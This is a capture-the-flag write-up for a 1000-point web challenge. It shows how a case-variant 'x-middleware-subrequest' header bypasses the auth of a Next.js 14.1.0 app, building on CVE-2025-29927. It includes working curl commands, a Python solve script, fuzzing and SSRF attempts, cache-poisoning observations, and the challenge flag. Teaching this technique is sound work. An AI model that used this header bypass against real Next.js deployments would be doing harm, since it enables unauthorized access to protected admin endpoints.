# Lazarus

**Category:** Web · **Points:** 1000 · **Author:** Aakarsh Mishra

> SecureBoard v2.1 — "patched, sealed, mended"... or so they'd have thee believe. &nbsp; `http://laz.136.82.117.70.nip.io/`

**Flag:** `kBxAc{edge_runtime_unicode_collation_folds_accents_bypassing_auth_to_poison_admin_cache}`

---

## TL;DR

A Next.js app guards its admin API with a check for the internal `x-middleware-subrequest` header. The catch: Next.js matches that header **exactly** (`middleware`), but the app's own admin check matches it **case-insensitively**. So sending the lowercase word gets eaten by Next's machinery, while sending it with a single capital letter — `Middleware` — slips past Next untouched *and* still fools the app into thinking you're a trusted internal request. One header, one capital letter, flag.

```bash
curl -s http://laz.136.82.117.70.nip.io/api/admin/live -H 'x-middleware-subrequest: Middleware'
```

## What We're Given

The challenge hands us a URL — `http://laz.136.82.117.70.nip.io/` — and a wall of flowery medieval text. CTF flavor text is almost never *just* flavor, so let's translate it from Ye Olde English into "what is the author actually telling me?":

- *"the ward they once failed to hold, and prouder still of the iron they hath since laid across that door"* → They had a vulnerability. They patched it.
- *"The scrolls they hand thee at the gate bear witness to their diligence — patched, sealed, mended."* → There's visible evidence of the patch.
- *"They wouldst have thee believe the matter long settled."* → ...but it isn't actually fixed. (Classic misdirection.)
- *"Thou art given the keys to the common hall. The dashboard awaiteth."* → You get normal-user access to a dashboard.
- *"What lieth beyond the common hall is another matter entirely."* → The goal is the admin area beyond the dashboard.

And the name of the challenge: **Lazarus** — the biblical character raised from the dead. So: a "dead" (patched) bug that comes **back to life**. Hold that thought.

## Initial Recon

First stop: just look at the site. It's a slick little internal tool called **SecureBoard v2.1**. The homepage links to two things:

- `/dashboard` — a project board
- `/api/admin/live` — labeled "Admin API"

The page source tells us it's built with **Next.js** (those `/_next/static/...` script tags are a dead giveaway), and digging into the JavaScript bundles pins the exact version:

```
G="14.1.0"   // from the main chunk: window.next.version = "14.1.0"
```

**Next.js 14.1.0** is a big deal, because that version is vulnerable to **CVE-2025-29927** — a famous middleware authentication-bypass bug. This matches the flavor text perfectly: "the ward they once failed to hold" = the middleware vuln.

Let's poke the two endpoints:

```bash
$ curl -s http://laz.../api/admin/live
{"source":"cache","variant":"default","data":{"message":"Access denied. Admin only.","flag":null}}

$ curl -s http://laz.../dashboard
{"pageProps":{"data":{"user":"r.sharma","projects":[ ...5 projects... ]}}}
```

So:
- The dashboard treats us as a normal user, `r.sharma`. There's no login page and the site never sets a cookie — you're just *anonymously* r.sharma.
- The admin API clearly has the flag (`"flag":null`), but only shows it to some privileged **`variant`**. We get `variant:"default"` and a polite "Access denied. Admin only."

Our entire job boils down to one question: **how do we flip `variant` from `"default"` to `"admin"`?**

### The crash course on CVE-2025-29927

Next.js lets you put a `middleware.ts` file in front of your app to run code (like auth checks) before every request. Internally, when the framework makes a sub-request to itself, it tags it with a header, `x-middleware-subrequest`, so it doesn't loop forever. The bug: in vulnerable versions, if **you** (the attacker) send that header with the right value, Next.js assumes the request is internal and **skips the middleware entirely** — bypassing any auth it was doing.

For 14.1.0 specifically, the check in Next's source is dead simple:

```js
// packages/next/src/server/web/sandbox/sandbox.ts
const subrequests = subreq.split(':')
if (subrequests.includes(params.name)) {   // params.name === "middleware"
  // ...skip the middleware entirely...
}
```

So in theory, `x-middleware-subrequest: middleware` should let us waltz past the middleware. Let's try it.

## The Rabbit Holes (a.k.a. why this was a 1000-pointer)

This is the part where I'll be honest about how long I wandered, because the dead ends are half the lesson.

**Rabbit hole #1: "The bypass does nothing."** I fired the classic payload at the admin API:

```bash
$ curl -s http://laz.../api/admin/live -H 'x-middleware-subrequest: middleware'
{"source":"cache","variant":"default", ... "flag":null}    # identical. no change.
```

Nothing. I tried every variant from the blog posts — repeating it five times, adding colons, `src/middleware`, changing the header's capitalization, duplicate headers split so Node merges them... all identical. I concluded the bug was "really patched" and moved on. **This was wrong, and it cost me a lot of time.**

**Rabbit hole #2: the empty admin wing.** I found that `/admin/*` *does* behave differently — every path under it redirects you to `/403` (Forbidden). And here's the thing: when I added `x-middleware-subrequest: middleware` to an `/admin` request, the redirect *vanished* and I got a plain 404 instead:

```bash
$ curl -si http://laz.../admin/live                               # 307 -> /403
$ curl -si http://laz.../admin/live -H 'x-middleware-subrequest: middleware'   # 404
```

So the middleware bypass **did** work after all — it skipped the redirect-to-403 guard! Exciting... except there are no actual pages behind `/admin/*`. Every path 404s once you bypass the guard. I fuzzed dozens of names (`/admin/panel`, `/admin/flag`, `/admin/monitor`, ...) — nothing but empty rooms. The whole `/admin` wing is a decoy.

**Rabbit hole #3: "It must be an internal-only endpoint."** The admin API ignored *everything* I threw at it — I tested, no exaggeration, **~26,000 requests**:
- ~6,500 different query-parameter names set to `admin`
- ~6,500 header names set to `admin`
- the same again on the dashboard watching the `user` field
- cookies, `Host` spoofing, `X-Forwarded-For` / `X-Real-IP` / `Via` (empty and set to `127.0.0.1`), `Authorization`, every HTTP method, RSC/prefetch headers, cache-control tricks, Next's internal `x-middleware-override-headers` injection trick...

Every single one returned `variant:"default"`. The homepage even brags that it's "live monitoring for **internal teams**," which screamed "the admin check is based on your source IP — you have to be *inside* the network." That sent me chasing a **Server-Side Request Forgery (SSRF)** angle: I found that Next's built-in image optimizer (`/_next/image?url=/api/admin/live`) *does* fetch the admin API from inside the server... but it only ever returns images, and our endpoint returns JSON, so it just errors with "not a valid image." Dead end for stealing the body.

At this point everything pointed at "unsolvable from the outside," which for a CTF means **I had the wrong model**. Time to look harder at the one header the whole challenge is named around.

## The Vulnerability / Trick

Here's the actual bug, and it's beautiful.

There are **two completely separate pieces of code** that look at the `x-middleware-subrequest` header, and they compare it **differently**:

1. **Next.js's built-in skip check** (the CVE-2025-29927 machinery) does an **exact, case-sensitive** match: it literally checks if one of the colon-separated pieces `=== "middleware"`.

2. **The challenge author's admin check** inside the `/api/admin/live` route *also* looks at that header to decide "is this a trusted internal request?" — but it compares it **case-insensitively** (the Edge runtime's Unicode string collation folds upper/lowercase, and even accented characters, together). Think of it like how a database search for `"cafe"` can also match `"CAFÉ"`.

Now watch what happens depending on exactly what you send:

| You send... | Next's exact check (`=== "middleware"`) | App's fuzzy check (fold to "middleware"?) | Result |
|---|---|---|---|
| `middleware` | ✅ matches → **Next eats the header & skips the middleware** | — (header already consumed) | `variant:"default"` ❌ |
| `Middleware` | ❌ doesn't match → header passes through untouched | ✅ folds to "middleware" → trusted! | `variant:"admin"` ✅ **FLAG** |
| `MIDDLEWARE` | ❌ | ✅ | **FLAG** ✅ |
| `internal`, `1`, `src/middleware` | ❌ | ❌ | `variant:"default"` ❌ |

Do you see the trap? The *obvious* payload everyone sends — lowercase `middleware` — is the **one value that gets intercepted and thrown away by Next before your app ever sees it**. You need a value that:

- is **different enough** that Next's strict check ignores it (so the header survives all the way to the app), but
- is **similar enough** that the app's sloppy, case-folding check still says "yep, that's `middleware`, you're trusted."

A single capital letter — `Middleware` — threads that needle perfectly. That's the "blind spot" between a strict comparison and a lenient one.

And **that's "Lazarus"**: the patched CVE-2025-29927 isn't really dead. It claws its way back to life through the gap between two string comparisons. The flag spells it out: `edge_runtime_unicode_collation_folds_accents_bypassing_auth_to_poison_admin_cache`.

> **Why this class of bug is real and scary:** mixing a case-*sensitive* security decision with a case-*insensitive* one is a classic source of auth bypasses (it's the same family of bug as Unicode case-folding tricks like `ı`→`I`, or `ß`→`SS`). Any time two layers "agree" on what a value means but implement that agreement with different comparison rules, an attacker lives in the difference.

## Building the Exploit

There's genuinely nothing to build — the whole exploit is one header with a capital letter. But let's walk through *why* each piece matters, using a quick experiment that proves the mechanism:

```bash
B=http://laz.136.82.117.70.nip.io

# Lowercase: Next consumes the header, we stay a peasant
curl -s $B/api/admin/live -H 'x-middleware-subrequest: middleware'
#   -> "variant":"default", "flag":null

# Any case variant: header survives Next, app trusts us
for v in Middleware MIDDLEWARE MiDdLeWaRe mIddleware; do
  curl -s $B/api/admin/live -H "x-middleware-subrequest: $v" | grep -o '"variant":"[^"]*"'
done
#   -> "variant":"admin"  (every one of them)
```

The first request returning `default` and the rest returning `admin` is the proof that the two checks disagree exactly as described.

Here's the self-contained solve script (`solve.py`):

```python
import requests
BASE = "http://laz.136.82.117.70.nip.io"

def exploit(value="Middleware"):
    r = requests.get(f"{BASE}/api/admin/live",
                     headers={"x-middleware-subrequest": value}, timeout=15)
    return r.json()

print("lowercase 'middleware' (eaten by Next):", exploit("middleware"))
data = exploit("Middleware")               # case variant -> admin
print("FLAG:", data["data"]["flag"])
```

## Running It

```bash
$ curl -s http://laz.136.82.117.70.nip.io/api/admin/live -H 'x-middleware-subrequest: Middleware'
{"source":"fresh","variant":"admin","data":{
   "message":"Admin live feed",
   "flag":"kBxAc{edge_runtime_unicode_collation_folds_accents_bypassing_auth_to_poison_admin_cache}",
   "clearance":"TOP_SECRET"}}
```

There it is. One neat detail: the very first successful hit came back as `"source":"fresh"`, and every hit after that said `"source":"cache"`. That means our admin response got written into the server's shared cache — the "**poison admin cache**" part of the flag. (Side effect: once you've popped it, the admin feed may even get served to other visitors from the cache. Cache + auth is a dangerous mix.)

**Flag:**
```
kBxAc{edge_runtime_unicode_collation_folds_accents_bypassing_auth_to_poison_admin_cache}
```

## Key Takeaways

- **Read the flavor text literally.** "Patched but they'd *have you believe* it's settled" + a challenge named after a resurrection = "the bypass still works, you're just not sending it right." I should have trusted that over my own early "it's patched" conclusion.
- **The obvious payload can be a trap.** Everyone sends `x-middleware-subrequest: middleware`. That exact value is the one Next.js intercepts, so it's the *only* value guaranteed to fail here. The author weaponized the canonical PoC against the solver.
- **Case-sensitive vs. case-insensitive comparisons are a security boundary.** When one layer checks a value strictly and another checks it loosely, attackers live in the gap. Case folding, Unicode normalization, and accent folding are all classic ways to make "not equal" and "equal" true at the same time.
- **Don't over-model.** I built an elaborate (and wrong) theory that the gate was an unspoofable internal-IP check, and burned ~26,000 requests and two SSRF rabbit holes on it. The real answer was a one-character tweak to the *one header the challenge was themed around*. When black-box testing says "impossible," re-examine your assumptions before assuming you need an exotic primitive.
- **Tooling tip:** when a value-based bypass isn't landing, fuzz the *dimensions of the value itself* (case, encoding, Unicode normalization, whitespace), not just a bigger wordlist of names. That's the dimension that cracked this.
